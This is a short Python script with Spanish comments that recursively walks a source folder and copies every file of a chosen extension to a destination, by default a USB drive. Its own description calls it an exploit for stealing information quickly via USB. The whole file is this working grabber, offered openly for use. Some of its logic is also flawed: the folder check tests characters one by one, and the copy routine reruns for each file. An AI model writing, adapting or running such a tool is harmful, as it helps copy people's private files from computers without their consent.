import os
import shutil #Libreria para copiar archivos
import argparse #Libreria de interfaz grafica
args = None

def log_file(archivo_error):
    if os.path.exists(str(args.destination+'log_error.txt')):
        with open(str(args.destination+'log_error.txt'),'r+') as file:
            file.seek(0,2)
            file.write(str(archivo_error+'\n'))
    else:
        with open(str(args.destination+'log_error.txt'),'w') as file:
            file.write(str(archivo_error+'\n'))

#Copia todas las fotos de una pc
def copiar(directorio,extencio_user):
    lista_archivos = os.listdir(directorio)
    extencio_user = str('.'+extencio_user)
    for archivo in lista_archivos:   
        if extencio_user in archivo:
            directorio_archivo = os.path.join(directorio,archivo)
            try:
                shutil.copy(directorio_archivo,args.destination)
            except shutil.SameFileError:
                pass
            except PermissionError:
                log_file(directorio_archivo)

#Muestra tods los archivos de una pc
def mostrar_archivos(directorio):
    lista_archivos = os.listdir(directorio)
    for valor in lista_archivos:      
        #Si no existe un . en el archivo analizado asumo que es un carpeta y entro
        if not any('.' in palabra for palabra in valor):
            #Concateno el valor actual de lista de archivos con la sgte carpeta
            lista_archivos = os.path.join(directorio,valor)
            if os.path.isdir(lista_archivos):
                mostrar_archivos(lista_archivos)
        else:
            copiar(directorio,args.extension)

if __name__ == '__main__':
    print(r"Created by K2s_UCI")
    parser = argparse.ArgumentParser(description="Exploit con el objetivo de robar informacion de manera\
    rapida, pruebame via USB y agrega la extencion")
    parser.add_argument('-s',"--source" ,type=str ,help="Choose the sources to copy")
    parser.add_argument('-d',"--destination" ,type=str ,default=os.getcwd() ,help="Chose the destination to copy,default USB")
    parser.add_argument('-e',"--extension", type=str ,default="", help="Write the extension to copy")
    args = parser.parse_args()
    mostrar_archivos(args.source)
    

 
    

 
